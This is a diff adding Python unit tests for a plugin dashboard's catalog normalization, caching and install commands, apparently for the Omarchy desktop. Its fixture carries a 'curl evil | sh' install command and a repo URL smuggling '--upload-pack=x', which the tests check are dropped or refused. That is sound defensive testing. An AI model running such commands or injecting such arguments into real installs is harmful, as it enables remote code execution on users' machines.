@@ -2356,3 +2356,188 @@ class LeftoversTests(RemovalFixture):
         with patch.object(dash, 'cmd_remove', lambda a: seen.append(a.purge) or print(json.dumps({'ok': True}))):
             dash.execute_job(dash.new_job('remove', ['p'], {'purge': True}))
         self.assertEqual(seen, [True])
+
+
+def catalog_entry(**over):
+    e = {'id': 'acme.weather', 'name': 'Weather', 'description': 'Forecast in the bar.', 'author': 'acme',
+         'version': '1.0.0', 'category': 'Widgets', 'kind': 'Bar widget', 'tags': ['weather'],
+         'repo': 'https://github.com/acme/omarchy-weather', 'sourceType': 'community',
+         'repositoryLayout': 'root-plugin', 'installAvailable': True, 'status': 'Available',
+         'verificationStatus': 'verified', 'verificationCoverage': 'snapshot-verified', 'stars': 12,
+         'addedAt': '2026-09-01', 'repositoryUpdatedAt': '2026-10-01T00:00:00Z',
+         'installCommand': 'curl evil | sh', 'installNote': ''}
+    e.update(over)
+    return e
+
+
+class NormalizeCatalogTests(unittest.TestCase):
+    def test_keeps_what_the_panel_shows_and_drops_the_rest(self):
+        [p] = dash.normalize_catalog({'plugins': [catalog_entry()]})
+        self.assertTrue(p['installable'])
+        self.assertEqual(p['verification'], 'verified')
+        self.assertEqual(p['repo'], 'https://github.com/acme/omarchy-weather')
+        self.assertNotIn('installCommand', p)
+
+    def test_builtins_bad_ids_and_duplicates_are_left_out(self):
+        plugins = dash.normalize_catalog({'plugins': [
+            catalog_entry(id='omarchy.clock', sourceType='builtin'),
+            catalog_entry(id='../escape'),
+            catalog_entry(),
+            catalog_entry(name='Second copy'),
+            'not a dict',
+        ]})
+        self.assertEqual([(p['id'], p['name']) for p in plugins], [('acme.weather', 'Weather')])
+
+    def test_manual_setup_suites_and_odd_repos_are_not_installable(self):
+        cases = [catalog_entry(repositoryLayout='suite', installNote='Has its own installer.'),
+                 catalog_entry(installAvailable=False), catalog_entry(status='Compatibility failed'),
+                 catalog_entry(repo='https://gitlab.com/acme/weather'),
+                 catalog_entry(repo='https://github.com/acme/weather --upload-pack=x')]
+        for e in cases:
+            [p] = dash.normalize_catalog({'plugins': [e]})
+            self.assertFalse(p['installable'], e)
+            self.assertTrue(p['note'])
+        self.assertEqual(dash.normalize_catalog({'plugins': [cases[0]]})[0]['note'], 'Has its own installer.')
+
+    def test_repo_url_loses_trailing_git_and_slash(self):
+        self.assertEqual(dash.catalog_repo('https://github.com/a/b.git'), 'https://github.com/a/b')
+        self.assertEqual(dash.catalog_repo('https://github.com/a/b/'), 'https://github.com/a/b')
+        self.assertEqual(dash.catalog_repo('git@github.com:a/b'), '')
+
+    def test_not_a_catalog_raises(self):
+        with self.assertRaises(ValueError):
+            dash.normalize_catalog({'items': []})
+
+
+class CatalogFixture(unittest.TestCase):
+    def setUp(self):
+        self._tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self._tmp.cleanup)
+        root = Path(self._tmp.name)
+        self.plugins = root / 'plugins'
+        self.plugins.mkdir()
+        for name, value in (('STATE', root / 'state'), ('PLUGINS_DIR', self.plugins)):
+            p = patch.object(dash, name, value)
+            p.start()
+            self.addCleanup(p.stop)
+        p = patch.object(dash, 'check_all', lambda: {})
+        p.start()
+        self.addCleanup(p.stop)
+
+    def output(self, fn, args):
+        buf = __import__('io').StringIO()
+        with __import__('contextlib').redirect_stdout(buf):
+            fn(args)
+        return json.loads(buf.getvalue().strip().splitlines()[-1])
+
+
+class CmdCatalogTests(CatalogFixture):
+    def test_fetches_and_caches_then_serves_the_cache(self):
+        fetched = []
+        def fake_fetch():
+            fetched.append(1)
+            return {'generatedAt': 'x', 'plugins': dash.normalize_catalog({'plugins': [catalog_entry()]})}
+        with patch.object(dash, 'fetch_catalog', fake_fetch):
+            r1 = self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=False))
+            r2 = self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=False))
+            self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=True))
+        self.assertEqual((r1['ok'], r1['count'], r2['count']), (True, 1, 1))
+        self.assertEqual(len(fetched), 2)
+        self.assertEqual(dash._read_json(dash.catalog_path(), {})['plugins'][0]['id'], 'acme.weather')
+
+    def test_failed_fetch_keeps_the_old_list_and_says_why(self):
+        dash._write_json(dash.catalog_path(), {'ts': 1, 'plugins': [{'id': 'old'}]})
+        def boom():
+            raise OSError('no network')
+        with patch.object(dash, 'fetch_catalog', boom):
+            r = self.output(dash.cmd_catalog, __import__('argparse').Namespace(force=False))
+        self.assertFalse(r['ok'])
+        saved = dash._read_json(dash.catalog_path(), {})
+        self.assertEqual(saved['plugins'], [{'id': 'old'}])
+        self.assertIn('no network', saved['error'])
+
+
+class CmdInstallTests(CatalogFixture):
+    def setUp(self):
+        super().setUp()
+        dash._write_json(dash.catalog_path(), {'ts': time.time(), 'plugins': dash.normalize_catalog({'plugins': [
+            catalog_entry(), catalog_entry(id='acme.suite', repositoryLayout='suite', installNote='Own installer.'),
+            catalog_entry(id='acme.bar', repo='https://github.com/acme/bar')]})})
+        self.calls = []
+        self.add_rc = 0
+        self.kinds = ['bar-widget']
+        self.listed = True
+
+        def fake(args, cwd=None, timeout=20, **kw):
+            self.calls.append(list(args))
+            if args[:3] == ['omarchy', 'plugin', 'add']:
+                if self.add_rc:
+                    return (1, '', 'omarchy-plugin-add: refusing to add: validation failed')
+                pid = 'acme.bar' if 'bar' in args[3] else 'acme.weather'
+                (self.plugins / pid).mkdir()
+                (self.plugins / pid / 'manifest.json').write_text(json.dumps({'version': '1.0.0', 'kinds': self.kinds}))
+                return (0, f'Added {pid} into {self.plugins / pid}\n', '')
+            if args[:3] == ['omarchy', 'plugin', 'list']:
+                return (0, json.dumps([{'id': 'acme.weather'}] if self.listed else []), '')
+            if args[:3] == ['omarchy', 'plugin', 'enable']:
+                return (0, '', '')
+            if args[:2] == ['git', '-C']:
+                return (0, 'abc123\n', '')
+            raise AssertionError('unexpected command: ' + ' '.join(args))
+        p = patch.object(dash, 'run', fake)
+        p.start()
+        self.addCleanup(p.stop)
+        p = patch.object(dash, 'INSTALL_DISCOVER_SECONDS', 0)
+        p.start()
+        self.addCleanup(p.stop)
+
+    def install(self, plugin_id):
+        return self.output(dash.cmd_install, __import__('argparse').Namespace(id=plugin_id))
+
+    def test_adds_from_the_catalogs_repo_then_enables_and_records_it(self):
+        r = self.install('acme.weather')
+        self.assertTrue(r['ok'], r)
+        self.assertIn(['omarchy', 'plugin', 'add', 'https://github.com/acme/omarchy-weather.git', '--yes'], self.calls)
+        self.assertIn(['omarchy', 'plugin', 'enable', 'acme.weather'], self.calls)
+        self.assertFalse(any('curl' in ' '.join(c) for c in self.calls))
+        last = dash.load_history()[-1]
+        self.assertEqual((last['action'], last['ok'], last['toVersion']), ('install', True, '1.0.0'))
+
+    def test_not_in_the_catalog_or_not_installable_never_runs_anything(self):
+        for plugin_id, says in (('acme.nope', 'not in the plugin catalog'), ('acme.suite', 'Own installer.')):
+            r = self.install(plugin_id)
+            self.assertFalse(r['ok'])
+            self.assertIn(says, r['message'])
+        self.assertEqual(self.calls, [])
+
+    def test_already_installed_is_refused(self):
+        (self.plugins / 'acme.weather').mkdir()
+        r = self.install('acme.weather')
+        self.assertFalse(r['ok'])
+        self.assertEqual(self.calls, [])
+
+    def test_a_refused_add_reports_omarchys_words(self):
+        self.add_rc = 1
+        r = self.install('acme.weather')
+        self.assertFalse(r['ok'])
+        self.assertIn('validation failed', r['message'])
+        self.assertFalse(dash.load_history()[-1]['ok'])
+
+    def test_a_replacement_bar_is_installed_but_left_off(self):
+        self.kinds = ['bar']
+        r = self.install('acme.bar')
+        self.assertTrue(r['ok'], r)
+        self.assertFalse(any(c[:3] == ['omarchy', 'plugin', 'enable'] for c in self.calls))
+        self.assertIn('left off', r['message'])
+
+    def test_not_picked_up_by_the_shell_is_a_failure_that_says_how_to_finish(self):
+        self.listed = False
+        r = self.install('acme.weather')
+        self.assertFalse(r['ok'])
+        self.assertIn('omarchy plugin enable acme.weather', r['message'])
+
+    def test_install_is_a_job_kind(self):
+        seen = []
+        with patch.object(dash, 'cmd_install', lambda a: seen.append(a.id) or print(json.dumps({'ok': True}))):
+            dash.execute_job(dash.new_job('install', ['acme.weather']))
+        self.assertEqual(seen, ['acme.weather'])
